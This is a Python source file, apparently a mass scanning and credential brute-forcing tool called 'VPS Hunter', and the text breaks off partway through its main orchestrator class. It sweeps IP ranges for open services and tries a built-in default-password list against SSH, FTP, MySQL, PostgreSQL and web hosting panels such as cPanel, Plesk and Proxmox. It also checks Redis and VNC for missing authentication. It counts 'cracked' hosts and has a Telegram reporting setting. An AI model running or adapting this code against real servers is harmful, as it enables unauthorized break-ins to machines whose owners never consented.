#!/usr/bin/env python3
"""
VPS Hunter v2.1 — Professional VPS Scanner & Credential Tester
Optimized & hardened by CAT 🐱
"""

import asyncio
import socket
import ssl
import ipaddress
import argparse
import logging
import sys
import time
import json
import os
import signal
from datetime import datetime, timedelta
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional, Tuple, Set, Any, Iterator
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from functools import partial
import hashlib
import re
import aiohttp
import urllib.parse

# ──────────────────────────────────────────────────────────────
# CONFIGURATION
# ──────────────────────────────────────────────────────────────

DEFAULT_PORTS = {
    "ssh": [22, 2222, 2200, 22222],
    "rdp": [3389, 4489],
    "vnc": [5900, 5901, 5902, 5903],
    "http": [80, 443, 8080, 8443, 8000, 8888, 5000, 9090],
    "ftp": [21, 2121],
    "mysql": [3306],
    "postgres": [5432],
    "redis": [6379],
    "mssql": [1433],
}

ALL_PORTS = []
for ports in DEFAULT_PORTS.values():
    ALL_PORTS.extend(ports)

# Credential database (built‑in)
CREDENTIALS_DB = {
    "ssh_root": [
        ("root", "root"), ("root", "root#1234"), ("root", "toor"), ("root", ""), ("root", "123456"),
        ("root", "password"), ("root", "admin"), ("root", "1234"), ("root", "12345"),
        ("root", "qwerty"), ("root", "letmein"), ("root", "changeme"),
        ("root", "123456789"), ("root", "12345678"), ("root", "abc123"),
        ("root", "monkey"), ("root", "master"), ("root", "dragon"),
        ("root", "login"), ("root", "passw0rd"), ("root", "hello"),
        ("root", "charlie"), ("root", "donald"), ("root", "shadow"),
        ("root", "sunshine"), ("root", "princess"), ("root", "football"),
        ("root", "iloveyou"), ("root", "trustno1"), ("root", "batman"),
        ("root", "access"), ("root", "hello123"), ("root", "password1"),
        ("root", "qwerty123"), ("root", "admin123"), ("root", "root123"),
        ("root", "pass123"), ("root", "test"), ("root", "ubuntu"),
        ("root", "debian"), ("root", "centos"), ("root", "fedora"),
        ("root", "almalinux"), ("root", "rocky"), ("root", "kali"),
        ("root", "parrot"), ("root", "test123"), ("root", "P@ssw0rd"),
        ("root", "p@ssword"), ("root", "Passw0rd"), ("root", "r00t"),
        ("root", "toor123"), ("root", "s3cur3"), ("root", "secure"),
        ("root", "server"), ("root", "vps"), ("root", "vpsserver"),
    ],
    "ssh_user": [
        ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
        ("admin", ""), ("admin", "admin123"), ("user", "user"),
        ("user", "password"), ("ubuntu", "ubuntu"), ("ubuntu", "password"),
        ("debian", "debian"), ("centos", "centos"), ("test", "test"),
        ("test", "123456"), ("deploy", "deploy"), ("git", "git"),
        ("www", "www"), ("www-data", "www-data"), ("nginx", "nginx"),
        ("apache", "apache"), ("mysql", "mysql"), ("postgres", "postgres"),
        ("redis", "redis"), ("backup", "backup"), ("manager", "manager"),
        ("support", "support"), ("ftp", "ftp"), ("cpanel", "cpanel"),
    ],
    "rdp": [
        ("Administrator", "password"), ("Administrator", "admin"),
        ("Administrator", "123456"), ("Administrator", ""),
        ("Administrator", "P@ssw0rd"), ("Administrator", "Admin123"),
        ("Administrator", "password1"), ("Administrator", "Welcome1"),
        ("Administrator", "Qwerty123"), ("Administrator", "Password1"),
        ("Admin", "admin"), ("Admin", "password"), ("Admin", "123456"),
        ("user", "user"), ("user", "password"), ("guest", "guest"),
    ],
    "ftp": [
        ("anonymous", ""), ("anonymous", "anonymous"), ("ftp", "ftp"),
        ("admin", "admin"), ("root", "root"), ("user", "user"),
    ],
    "mysql": [
        ("root", ""), ("root", "root"), ("root", "password"),
        ("root", "mysql"), ("root", "123456"), ("mysql", "mysql"),
        ("admin", "admin"),
    ],
    "postgres": [
        ("postgres", ""), ("postgres", "postgres"), ("postgres", "password"),
        ("postgres", "123456"),
    ],
    "redis": [
        ("", ""),  # no auth by default
    ],
}

# HTTP Panel Templates
PANEL_TEMPLATES = [
    {
        "name": "SolusVM",
        "paths": ["/login.php", "/vps/login.php"],
        "detect": "solusvm",
        "fields": {"username": "username", "password": "password"},
        "success_markers": ["dashboard", "logout", "solusvm", "clientarea"],
        "error_markers": ["invalid", "incorrect", "failed", "wrong"],
    },
    {
        "name": "Virtualizor",
        "paths": ["/index.php", "/vps/index.php"],
        "detect": "virtualizor",
        "fields": {"username": "username", "password": "password"},
        "success_markers": ["dashboard", "virtualizor", "act=vs"],
        "error_markers": ["invalid", "incorrect", "failed"],
    },
    {
        "name": "Proxmox",
        "paths": ["/"],
        "detect": "proxmox",
        "fields": {"username": "username", "password": "password"},
        "success_markers": ["pve", "proxmox", "version"],
        "error_markers": ["invalid", "incorrect"],
        "api_path": "/api2/json/access/ticket",
        "api_format": True,
    },
    {
        "name": "VestaCP",
        "paths": ["/login/", "/"],
        "detect": "vestacp",
        "fields": {"user": "user", "password": "password"},
        "success_markers": ["vesta", "list", "dashboard"],
        "error_markers": ["invalid", "incorrect", "wrong"],
    },
    {
        "name": "CyberPanel",
        "paths": ["/login"],
        "detect": "cyberpanel",
        "fields": {"username": "username", "password": "password"},
        "success_markers": ["cyberpanel", "dashboard", "websiteslist"],
        "error_markers": ["invalid", "incorrect"],
    },
    {
        "name": "aaPanel",
        "paths": ["/login"],
        "detect": "aapanel",
        "fields": {"username": "username", "password": "password"},
        "success_markers": ["aapanel", "dashboard", "sites"],
        "error_markers": ["invalid", "incorrect"],
    },
    {
        "name": "cPanel",
        "paths": ["/login", "/cpsess", "/whm"],
        "detect": "cpanel",
        "fields": {"user": "user", "pass": "pass"},
        "success_markers": ["cpanel", "frontend", "cgi-sys"],
        "error_markers": ["invalid", "incorrect"],
    },
    {
        "name": "Plesk",
        "paths": ["/login_up.php"],
        "detect": "plesk",
        "fields": {"login_name": "login_name", "passwd": "passwd"},
        "success_markers": ["plesk", "smb", "dashboard"],
        "error_markers": ["invalid", "incorrect"],
    },
    {
        "name": "Generic",
        "paths": ["/login", "/admin", "/admin/login", "/auth/login", "/user/login", "/api/auth/login"],
        "detect": None,
        "fields": {"username": "username", "password": "password"},
        "success_markers": ["dashboard", "home", "welcome", "logout", "profile"],
        "error_markers": ["invalid", "incorrect", "failed", "wrong"],
    },
]

# ──────────────────────────────────────────────────────────────
# DATA STRUCTURES
# ──────────────────────────────────────────────────────────────

@dataclass
class ScanResult:
    ip: str
    port: int
    protocol: str
    state: str  # open, closed, filtered
    banner: str = ""
    service: str = ""
    version: str = ""
    ssl: bool = False
    response_time: float = 0.0

@dataclass
class CrackResult:
    ip: str
    port: int
    protocol: str
    service: str
    username: str
    password: str
    panel_name: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now().strftime("%Y-%m-%d %H:%M:%S"))

    def to_dict(self):
        return asdict(self)

@dataclass
class TelegramConfig:
    token: str = ""
    chat_id: str = ""
    enabled: bool = False

@dataclass
class Stats:
    total_ips: int = 0
    scanned_ips: int = 0
    open_ports: int = 0
    attacked: int = 0
    cracked: int = 0
    attempts: int = 0
    start_time: float = field(default_factory=time.time)
    errors: int = 0

    @property
    def elapsed(self) -> str:
        delta = time.time() - self.start_time
        if delta < 60:
            return f"{delta:.1f}s"
        elif delta < 3600:
            return f"{delta/60:.1f}m"
        else:
            return f"{delta/3600:.1f}h"

    @property
    def speed(self) -> float:
        elapsed = time.time() - self.start_time
        if elapsed > 0:
            return self.attempts / elapsed
        return 0

# ──────────────────────────────────────────────────────────────
# COLORED OUTPUT
# ──────────────────────────────────────────────────────────────

class Colors:
    RESET = "\033[0m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    DIM = "\033[2m"

def cprint(color: str, msg: str):
    print(f"{color}{msg}{Colors.RESET}")

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
    ╦ ╦┌─┐┬  ┬┌─┐┌┐  ╔╦╗┌─┐┌┐ ╔═╗┬┬  ┌─┐
    ║║║├┤ └┐┌┘├┤ ├┴┐  ║ ├┤ ├┴┐║ ╦││  ├┤ 
    ╚╩╝└─┘ └┘ └─┘└─┘  ╩ └─┘└─┘╚═╝┴┴─┘└─┘
    ─────────────────────────────────────
    VPS Hunter v2.1 | Professional Scanner
    Optimized by CAT 🐱
    ─────────────────────────────────────
{Colors.RESET}"""
    print(banner)

# ──────────────────────────────────────────────────────────────
# DEPENDENCY CHECK
# ──────────────────────────────────────────────────────────────

def check_dependencies() -> Dict[str, bool]:
    """Return dict of library -> available."""
    libs = {
        "paramiko": False,
        "pymysql": False,
        "psycopg2": False,
        "redis": False,
        "aiohttp": True,  # already imported
    }
    missing = []
    for lib in libs:
        try:
            __import__(lib)
            libs[lib] = True
        except ImportError:
            missing.append(lib)
    if missing:
        cprint(Colors.YELLOW, f"[!] Optional libraries missing: {', '.join(missing)}. "
                               "Install with: pip install {' '.join(missing)}")
    return libs

# ──────────────────────────────────────────────────────────────
# PROGRESS DISPLAY
# ──────────────────────────────────────────────────────────────

class ProgressDisplay:
    def __init__(self):
        self.enabled = sys.stdout.isatty()
        self.last_update = 0
        self.min_interval = 0.1

    def update(self, stats: Stats, current_target: str = ""):
        if not self.enabled:
            return
        now = time.time()
        if now - self.last_update < self.min_interval:
            return
        self.last_update = now

        lines = [
            f"  {Colors.BOLD}═══ VPS Hunter ═══{Colors.RESET}",
            f"  {Colors.CYAN}Target{Colors.RESET}: {stats.scanned_ips}/{stats.total_ips} IPs",
            f"  {Colors.GREEN}Open{Colors.RESET}: {stats.open_ports} ports",
            f"  {Colors.YELLOW}Attacked{Colors.RESET}: {stats.attacked}",
            f"  {Colors.RED}Cracked{Colors.RESET}: {stats.cracked} ★",
            f"  {Colors.MAGENTA}Attempts{Colors.RESET}: {stats.attempts} ({stats.speed:.1f}/s)",
            f"  {Colors.DIM}Elapsed{Colors.RESET}: {stats.elapsed}",
        ]
        if current_target:
            lines.append(f"  {Colors.DIM}Current{Colors.RESET}: {current_target}")

        height = len(lines) + 2
        sys.stdout.write(f"\033[{height}A")
        sys.stdout.write("\033[J")
        for line in lines:
            print(line)

    def clear(self):
        if self.enabled:
            print("\033[J", end="")

# ──────────────────────────────────────────────────────────────
# WORDLIST MANAGER (streaming)
# ──────────────────────────────────────────────────────────────

class WordlistManager:
    def __init__(self):
        self._cache: Dict[str, List[Tuple[str, str]]] = {}
        self._custom_wordlist_cache: Optional[List[Tuple[str, str]]] = None

    def load_file_stream(self, path: str) -> Iterator[Tuple[str, str]]:
        """Stream wordlist line by line to save memory."""
        filepath = Path(path)
        if not filepath.exists():
            cprint(Colors.RED, f"  [!] Wordlist not found: {path}")
            return iter([])

        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                if ':' in line:
                    parts = line.split(':', 1)
                    yield (parts[0], parts[1])
                elif ' ' in line:
                    parts = line.split(' ', 1)
                    yield (parts[0], parts[1])
                else:
                    yield (line, line)   # user == pass

    def get_creds(self, protocol: str, service: str = "", custom_path: str = None) -> List[Tuple[str, str]]:
        """Return list of credentials (for non‑streaming usage)."""
        if custom_path:
            # For simplicity we load all; but for huge files we could stream.
            # We'll keep it as list for now.
            filepath = Path(custom_path)
            if filepath.exists():
                creds = list(self.load_file_stream(custom_path))
                if creds:
                    cprint(Colors.GREEN, f"  [+] Loaded {len(creds)} combos from {custom_path}")
                    return creds
            else:
                cprint(Colors.RED, f"  [!] Wordlist not found: {custom_path}")

        key = f"{protocol}_{service}" if service else protocol
        if key in CREDENTIALS_DB:
            return CREDENTIALS_DB[key]

        fallbacks = {
            "ssh": ["ssh_root", "ssh_user"],
            "http": ["ssh_root", "ssh_user"],
        }
        if protocol in fallbacks:
            result = []
            for k in fallbacks[protocol]:
                if k in CREDENTIALS_DB:
                    result.extend(CREDENTIALS_DB[k])
            return result

        return CREDENTIALS_DB.get("ssh_root", [])

    def get_creds_stream(self, protocol: str, service: str = "", custom_path: str = None) -> Iterator[Tuple[str, str]]:
        """Stream credentials; if custom_path given, yield from file (cached in memory), else from built‑in."""
        if custom_path:
            if self._custom_wordlist_cache is None:
                filepath = Path(custom_path)
                if filepath.exists():
                    self._custom_wordlist_cache = list(self.load_file_stream(custom_path))
                    cprint(Colors.GREEN, f"  [+] Loaded {len(self._custom_wordlist_cache)} combos into cache")
                else:
                    cprint(Colors.RED, f"  [!] Wordlist not found: {custom_path}")
                    self._custom_wordlist_cache = []
            
            for u, p in self._custom_wordlist_cache:
                yield u, p
            return

        # Use built‑in list
        creds = self.get_creds(protocol, service, None)
        for u, p in creds:
            yield u, p

# ──────────────────────────────────────────────────────────────
# NETWORK UTILITIES
# ──────────────────────────────────────────────────────────────

class NetworkUtils:
    @staticmethod
    def count_targets(target_str: str) -> int:
        count = 0
        if target_str.startswith('@'):
            filepath = target_str[1:]
            if Path(filepath).exists():
                with open(filepath, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            count += NetworkUtils.count_targets(line)
        elif '/' in target_str:
            try:
                network = ipaddress.ip_network(target_str, strict=False)
                # hosts() excludes network/broadcast
                count += max(1, network.num_addresses - 2)
            except ValueError:
                count += 1
        elif '-' in target_str:
            parts = target_str.split('-')
            if len(parts) == 2:
                try:
                    start_str = parts[0].strip()
                    end_str = parts[1].strip()
                    start_ip = ipaddress.ip_address(start_str)
                    if '.' in end_str:
                        end_ip = ipaddress.ip_address(end_str)
                    else:
                        octets = start_str.split('.')
                        octets[-1] = end_str
                        end_ip = ipaddress.ip_address('.'.join(octets))
                    count += int(end_ip) - int(start_ip) + 1
                except ValueError:
                    count += 1
            else:
                count += 1
        else:
            count += 1
        return count

    @staticmethod
    def parse_targets(target_str: str) -> Iterator[str]:
        if target_str.startswith('@'):
            filepath = target_str[1:]
            if Path(filepath).exists():
                with open(filepath, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            yield from NetworkUtils.parse_targets(line)
                return

        if '/' in target_str:
            try:
                network = ipaddress.ip_network(target_str, strict=False)
                for ip in network.hosts():
                    yield str(ip)
            except ValueError:
                yield target_str

        elif '-' in target_str:
            parts = target_str.split('-')
            if len(parts) == 2:
                start_str = parts[0].strip()
                end_str = parts[1].strip()
                try:
                    start_ip = ipaddress.ip_address(start_str)
                    if '.' in end_str:
                        end_ip = ipaddress.ip_address(end_str)
                    else:
                        octets = start_str.split('.')
                        octets[-1] = end_str
                        end_ip = ipaddress.ip_address('.'.join(octets))
                    current = int(start_ip)
                    end = int(end_ip)
                    while current <= end:
                        yield str(ipaddress.ip_address(current))
                        current += 1
                except ValueError:
                    yield target_str
        else:
            try:
                resolved = socket.gethostbyname(target_str)
                if resolved != target_str:
                    cprint(Colors.DIM, f"  [*] {target_str} -> {resolved}")
                yield resolved
            except socket.gaierror:
                yield target_str

    @staticmethod
    def detect_protocol(port: int) -> str:
        for proto, ports in DEFAULT_PORTS.items():
            if port in ports:
                return proto
        return "unknown"

# ──────────────────────────────────────────────────────────────
# SCANNER
# ──────────────────────────────────────────────────────────────

class Scanner:
    def __init__(self, timeout: float = 3.0, max_concurrent: int = 200,
                 ports: List[int] = None, stealth: bool = False):
        self.timeout = timeout
        self.max_concurrent = max_concurrent
        self.ports = ports or ALL_PORTS
        self.stealth = stealth
        self.semaphore = asyncio.Semaphore(max_concurrent)

    async def grab_banner(self, reader: asyncio.StreamReader) -> str:
        try:
            banner = await asyncio.wait_for(reader.read(1024), timeout=2.0)
            return banner.decode('utf-8', errors='ignore').strip()
        except:
            return ""

    def parse_ssh_banner(self, banner: str) -> Tuple[str, str]:
        match = re.search(r'SSH-[\d.]+-(.+)', banner)
        if match:
            software = match.group(1)
            version = ""
            ver_match = re.search(r'([\d.]+)', software)
            if ver_match:
                version = ver_match.group(1)
            return software, version
        return "Unknown", ""

    def parse_http_banner(self, banner: str) -> Tuple[str, str]:
        server = ""
        version = ""
        for line in banner.split('\r\n'):
            if line.lower().startswith('server:'):
                server = line.split(':', 1)[1].strip()
                ver_match = re.search(r'([\d.]+)', server)
                if ver_match:
                    version = ver_match.group(1)
                break
        return server or "Unknown", version

    async def scan_port(self, ip: str, port: int) -> Optional[ScanResult]:
        async with self.semaphore:
            start_time = time.time()
            protocol = NetworkUtils.detect_protocol(port)
            is_ssl = port in [443, 8443, 993, 995]

            try:
                if is_ssl:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(ip, port, ssl=ctx),
                        timeout=self.timeout
                    )
                else:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(ip, port),
                        timeout=self.timeout
                    )

                response_time = time.time() - start_time
                banner = await self.grab_banner(reader)

                service = ""
                version = ""
                if protocol == "ssh":
                    service, version = self.parse_ssh_banner(banner)
                elif protocol == "http":
                    service, version = self.parse_http_banner(banner)
                    if not service or service == "Unknown":
                        if "nginx" in banner.lower():
                            service, version = "nginx", ""
                        elif "apache" in banner.lower():
                            service, version = "apache", ""
                elif protocol == "ftp":
                    if "FTP" in banner:
                        match = re.search(r'(\w+)', banner)
                        service = match.group(1) if match else "ftp"

                result = ScanResult(
                    ip=ip, port=port, protocol=protocol, state="open",
                    banner=banner[:100], service=service, version=version,
                    ssl=is_ssl, response_time=response_time
                )
                writer.close()
                await writer.wait_closed()
                return result

            except (asyncio.TimeoutError, ConnectionRefusedError,
                    ConnectionResetError, OSError, ssl.SSLError):
                return None

    async def scan_host(self, ip: str) -> List[ScanResult]:
        tasks = [self.scan_port(ip, port) for port in self.ports]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return [r for r in results if r is not None and isinstance(r, ScanResult)]

    async def scan_network(self, targets: List[str], stats: Stats,
                           progress: ProgressDisplay) -> List[ScanResult]:
        all_results = []
        for ip in targets:
            stats.scanned_ips += 1
            results = await self.scan_host(ip)
            for r in results:
                all_results.append(r)
                stats.open_ports += 1
                banner_preview = r.banner[:40].replace('\n', ' ') if r.banner else "no banner"
                cprint(Colors.GREEN,
                    f"  [OPEN] {r.ip}:{r.port} [{r.protocol}] {r.service} {r.version} — {banner_preview}")
            progress.update(stats, ip)
        return all_results

# ──────────────────────────────────────────────────────────────
# SSH CRACKER (with configurable thread pool)
# ──────────────────────────────────────────────────────────────

class SSHCracker:
    def __init__(self, timeout: float = 5.0, max_concurrent: int = 20,
                 delay: float = 0.0, max_workers: int = 10):
        self.timeout = timeout
        self.delay = delay
        self.semaphore = asyncio.Semaphore(max_concurrent)
        self.executor = ThreadPoolExecutor(max_workers=max_workers)
        self._paramiko = None

    def _get_paramiko(self):
        if self._paramiko is None:
            try:
                import paramiko
                self._paramiko = paramiko
            except ImportError:
                cprint(Colors.RED, "  [!] paramiko not installed! Run: pip install paramiko")
                return None
        return self._paramiko

    def _try_credential(self, target: ScanResult, username: str,
                        password: str) -> Optional[CrackResult]:
        paramiko = self._get_paramiko()
        if not paramiko:
            return None
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        transport_options = {
            'banner_timeout': self.timeout,
            'auth_timeout': self.timeout,
            'timeout': self.timeout,
        }
        try:
            client.connect(
                hostname=target.ip, port=target.port,
                username=username, password=password,
                look_for_keys=False, allow_agent=False,
                **transport_options
            )
            stdin, stdout, stderr = client.exec_command('id', timeout=5)
            output = stdout.read().decode().strip()
            client.close()
            return CrackResult(
                ip=target.ip, port=target.port, protocol="ssh",
                service=f"{target.service} {target.version}".strip(),
                username=username, password=password
            )
        except paramiko.AuthenticationException:
            client.close()
            return None
        except (paramiko.SSHException, Exception):
            try:
                client.close()
            except:
                pass
            return None

    async def crack(self, target: ScanResult, creds_iter: Iterator[Tuple[str, str]],
                    stats: Stats) -> Optional[CrackResult]:
        loop = asyncio.get_running_loop()
        async with self.semaphore:
            for username, password in creds_iter:
                stats.attempts += 1
                if self.delay > 0:
                    await asyncio.sleep(self.delay)
                try:
                    result = await loop.run_in_executor(
                        self.executor,
                        self._try_credential,
                        target, username, password
                    )
                    if result:
                        return result
                except Exception:
                    stats.errors += 1
        return None

    def close(self):
        self.executor.shutdown(wait=False)

# ──────────────────────────────────────────────────────────────
# HTTP PANEL CRACKER (with session reuse)
# ──────────────────────────────────────────────────────────────

class HTTPCracker:
    def __init__(self, timeout: float = 10.0, max_concurrent: int = 30):
        self.timeout = timeout
        self.semaphore = asyncio.Semaphore(max_concurrent)
        self.session: Optional[aiohttp.ClientSession] = None

    async def _get_session(self) -> aiohttp.ClientSession:
        if self.session is None or self.session.closed:
            timeout_obj = aiohttp.ClientTimeout(total=self.timeout)
            connector = aiohttp.TCPConnector(ssl=False, limit=100, force_close=False)
            self.session = aiohttp.ClientSession(
                timeout=timeout_obj,
                connector=connector,
                headers={"User-Agent": "Mozilla/5.0 (compatible; VPSHunter/2.1)"}
            )
        return self.session

    async def close(self):
        if self.session and not self.session.closed:
            await self.session.close()

    async def detect_panel(self, target: ScanResult) -> List[dict]:
        detected = []
        scheme = "https" if target.ssl else "http"
        base_url = f"{scheme}://{target.ip}:{target.port}"
        session = await self._get_session()

        for template in PANEL_TEMPLATES:
            for path in template["paths"]:
                url = f"{base_url}{path}"
                try:
                    async with session.get(url, allow_redirects=False, ssl=False) as resp:
                        if resp.status == 200:
                            body = await resp.text()
                            is_match = False
                            if template["detect"]:
                                if template["detect"].lower() in body.lower():
                                    is_match = True
                            else:
                                if 'password' in body.lower() or 'login' in body.lower():
                                    is_match = True
                            if is_match:
                                detected.append({
                                    "template": template,
                                    "url": url,
                                    "body_sample": body[:500]
                                })
                                cprint(Colors.CYAN,
                                    f"    [PANEL] {template['name']} at {url}")
                                break
                except:
                    continue
        return detected

    async def try_panel_creds(self, panel_info: dict, target: ScanResult,
                              creds_iter: Iterator[Tuple[str, str]],
                              stats: Stats) -> Optional[CrackResult]:
        template = panel_info["template"]
        url = panel_info["url"]
        session = await self._get_session()

        # Proxmox API style
        if template.get("api_format") and template.get("api_path"):
            api_url = f"{url.rsplit('/', 1)[0]}{template['api_path']}"
            async with self.semaphore:
                for username, password in creds_iter:
                    stats.attempts += 1
                    try:
                        payload = {"username": username, "password": password}
                        async with session.post(api_url, json=payload, ssl=False) as resp:
                            if resp.status == 200:
                                data = await resp.json()
                                if "data" in data and "ticket" in data.get("data", {}):
                                    return CrackResult(
                                        ip=target.ip, port=target.port, protocol="http",
                                        service=f"{template['name']} API",
                                        username=username, password=password,
                                        panel_name=template['name']
                                    )
                    except:
                        stats.errors += 1
            return None

        # Standard form login
        # Get CSRF token
        csrf_token = None
        try:
            async with session.get(url, ssl=False) as resp:
                if resp.status == 200:
                    body = await resp.text()
                    csrf_patterns = [
                        r'name=["\']csrf[_-]?token["\']\s+value=["\']([^"\']+)',
                        r'name=["\']_token["\']\s+value=["\']([^"\']+)',
                        r'csrf_token["\']:["\']([^"\']+)',
                    ]
                    for pattern in csrf_patterns:
                        match = re.search(pattern, body)
                        if match:
                            csrf_token = match.group(1)
                            break
        except:
            pass

        async with self.semaphore:
            for username, password in creds_iter:
                stats.attempts += 1
                try:
                    payload = {}
                    for field_name, cred_field in template["fields"].items():
                        if cred_field in ("username", "user"):
                            payload[field_name] = username
                        elif cred_field in ("password", "pass"):
                            payload[field_name] = password
                    if csrf_token:
                        payload["csrf_token"] = csrf_token
                        payload["_token"] = csrf_token

                    async with session.post(
                        url, data=payload, allow_redirects=False, ssl=False
                    ) as resp:
                        is_success = False
                        # Check redirect
                        if resp.status in (302, 303, 301):
                            location = resp.headers.get('Location', '')
                            if not any(x in location.lower() for x in ('login', 'auth')):
                                is_success = True
                        # Check body for errors/success
                        elif resp.status == 200:
                            body = await resp.text()
                            error_markers = template.get("error_markers", ["invalid", "incorrect", "wrong", "failed"])
                            has_error = any(err in body.lower() for err in error_markers)
                            if not has_error:
                                for marker in template["success_markers"]:
                                    if marker.lower() in body.lower():
                                        is_success = True
                                        break
                        # Some APIs return 401 on failure
                        elif resp.status == 401:
                            is_success = False
                        else:
                            # 200 with no error considered success
                            pass

                        if is_success:
                            return CrackResult(
                                ip=target.ip, port=target.port, protocol="http",
                                service=template["name"],
                                username=username, password=password,
                                panel_name=template["name"]
                            )
                except Exception:
                    stats.errors += 1
        return None

    async def crack(self, target: ScanResult, creds_iter: Iterator[Tuple[str, str]],
                    stats: Stats) -> List[CrackResult]:
        results = []
        panels = await self.detect_panel(target)
        if not panels:
            return results
        for panel in panels:
            result = await self.try_panel_creds(panel, target, creds_iter, stats)
            if result:
                results.append(result)
        return results

# ──────────────────────────────────────────────────────────────
# FTP CRACKER
# ──────────────────────────────────────────────────────────────

class FTPCracker:
    def __init__(self, timeout: float = 5.0, max_workers: int = 10):
        self.timeout = timeout
        self.semaphore = asyncio.Semaphore(20)
        self.executor = ThreadPoolExecutor(max_workers=max_workers)

    async def crack(self, target: ScanResult, creds_iter: Iterator[Tuple[str, str]],
                    stats: Stats) -> Optional[CrackResult]:
        loop = asyncio.get_running_loop()

        def try_ftp(username: str, password: str) -> Optional[CrackResult]:
            try:
                import ftplib
                ftp = ftplib.FTP()
                ftp.connect(target.ip, target.port, timeout=self.timeout)
                ftp.login(username, password)
                ftp.quit()
                return CrackResult(
                    ip=target.ip, port=target.port, protocol="ftp",
                    service=target.service or "ftp",
                    username=username, password=password
                )
            except ftplib.error_perm:
                return None
            except:
                return None

        async with self.semaphore:
            for username, password in creds_iter:
                stats.attempts += 1
                result = await loop.run_in_executor(self.executor, try_ftp, username, password)
                if result:
                    return result
        return None

    def close(self):
        self.executor.shutdown(wait=False)

# ──────────────────────────────────────────────────────────────
# DATABASE CRACKER
# ──────────────────────────────────────────────────────────────

class DatabaseCracker:
    def __init__(self, timeout: float = 5.0, max_workers: int = 10):
        self.timeout = timeout
        self.semaphore = asyncio.Semaphore(15)
        self.executor = ThreadPoolExecutor(max_workers=max_workers)

    async def crack_mysql(self, target: ScanResult, creds_iter: Iterator[Tuple[str, str]],
                          stats: Stats) -> Optional[CrackResult]:
        loop = asyncio.get_running_loop()

        def try_mysql(username: str, password: str) -> Optional[CrackResult]:
            try:
                import pymysql
                conn = pymysql.connect(
                    host=target.ip, port=target.port,
                    user=username, password=password,
                    connect_timeout=self.timeout
                )
                conn.close()
                return CrackResult(
                    ip=target.ip, port=target.port, protocol="mysql",
                    service="MySQL", username=username, password=password
                )
            except:
                return None

        async with self.semaphore:
            for username, password in creds_iter:
                stats.attempts += 1
                result = await loop.run_in_executor(self.executor, try_mysql, username, password)
                if result:
                    return result
        return None

    async def crack_postgres(self, target: ScanResult, creds_iter: Iterator[Tuple[str, str]],
                             stats: Stats) -> Optional[CrackResult]:
        loop = asyncio.get_running_loop()

        def try_pg(username: str, password: str) -> Optional[CrackResult]:
            try:
                import psycopg2
                conn = psycopg2.connect(
                    host=target.ip, port=target.port,
                    user=username, password=password,
                    connect_timeout=self.timeout
                )
                conn.close()
                return CrackResult(
                    ip=target.ip, port=target.port, protocol="postgres",
                    service="PostgreSQL", username=username, password=password
                )
            except:
                return None

        async with self.semaphore:
            for username, password in creds_iter:
                stats.attempts += 1
                result = await loop.run_in_executor(self.executor, try_pg, username, password)
                if result:
                    return result
        return None

    async def crack_redis(self, target: ScanResult, stats: Stats) -> Optional[CrackResult]:
        loop = asyncio.get_running_loop()

        def try_redis() -> Optional[CrackResult]:
            try:
                import redis
                r = redis.Redis(
                    host=target.ip, port=target.port,
                    socket_timeout=self.timeout, socket_connect_timeout=self.timeout
                )
                r.ping()
                return CrackResult(
                    ip=target.ip, port=target.port, protocol="redis",
                    service="Redis", username="", password="[NO AUTH]"
                )
            except redis.exceptions.AuthenticationError:
                return None
            except:
                return None

        async with self.semaphore:
            stats.attempts += 1
            return await loop.run_in_executor(self.executor, try_redis)

    def close(self):
        self.executor.shutdown(wait=False)

# ──────────────────────────────────────────────────────────────
# VNC CRACKER
# ──────────────────────────────────────────────────────────────

class VNCCracker:
    def __init__(self, timeout: float = 5.0):
        self.timeout = timeout
        self.semaphore = asyncio.Semaphore(50)

    async def check_noauth(self, target: ScanResult, stats: Stats) -> Optional[CrackResult]:
        async with self.semaphore:
            stats.attempts += 1
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(target.ip, target.port),
                    timeout=self.timeout
                )
                
                # Receive RFB version
                version = await asyncio.wait_for(reader.read(12), timeout=2.0)
                if not version.startswith(b"RFB"):
                    writer.close()
                    return None
                    
                # Echo version back
                writer.write(version)
                await writer.drain()
                
                # Read security types count
                sec_count_bytes = await asyncio.wait_for(reader.read(1), timeout=2.0)
                if not sec_count_bytes:
                    writer.close()
                    return None
                    
                sec_count = sec_count_bytes[0]
                if sec_count == 0:
                    writer.close()
                    return None
                    
                # Read security types
                sec_types = await asyncio.wait_for(reader.read(sec_count), timeout=2.0)
                
                # Check if security type 1 (None) is supported
                if 1 in sec_types:
                    writer.close()
                    return CrackResult(
                        ip=target.ip, port=target.port, protocol="vnc",
                        service="VNC", username="", password="[NO AUTH]"
                    )
                    
                writer.close()
                await writer.wait_closed()
                return None
            except Exception:
                return None

# ──────────────────────────────────────────────────────────────
# MAIN ORCHESTRATOR
# ──────────────────────────────────────────────────────────────

class VPSHunter:
    def __init__(self, args):
        self.args = args
        self.stats = Stats()
        self.progress = ProgressDisplay()
        self.wordlist = WordlistManager()
        self.results: List[CrackResult] = []
        self.output_file = None
        self.deps = check_dependencies()
        
        self.telegram = TelegramConfig(
            token=args.telegram_token if hasattr(args, 'telegram_token') and args.telegram_token else "",
            chat_id=args.telegram_chat if hasattr(args, 'telegram_chat') and args.telegram_chat else "",
            enabled=bool(args.telegram_token and args.telegram_chat)
        )

        self.scanner = Scanner(
            timeout=args.timeout,
            max_concurrent=args.scan_concurrent,
